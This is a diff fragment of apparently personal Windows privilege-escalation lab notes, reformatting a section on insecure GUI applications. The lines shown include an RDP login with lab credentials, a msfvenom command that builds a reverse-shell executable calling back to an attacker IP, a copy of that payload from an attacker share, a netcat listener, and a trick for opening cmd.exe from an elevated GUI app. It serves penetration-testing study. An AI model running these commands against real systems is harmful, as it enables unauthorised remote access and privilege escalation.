@@ -333,9 +333,15 @@ nc -lvp 123
 schtasks /query /fo LIST /v
 ```
 
-________________________________________________
-CATEGORY : INSECURE GUI APPS
-________________________________________________
+## CATEGORY "INSECURE GUI APPS"
+```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+
+tasklist /V | findstr mspaint.exe
+file://C:/windows/system32/cmd.exe
+```
+
+
 
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
@@ -344,8 +350,6 @@ copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
 rdesktop -u user -p password321 10.10.88.2
 tasklist /V | findstr mspaint.exe
 file://C:/windows/system32/cmd.exe
-
-
 ________________________________________________
 CATEGORY : STARTUP APPS
 ________________________________________________
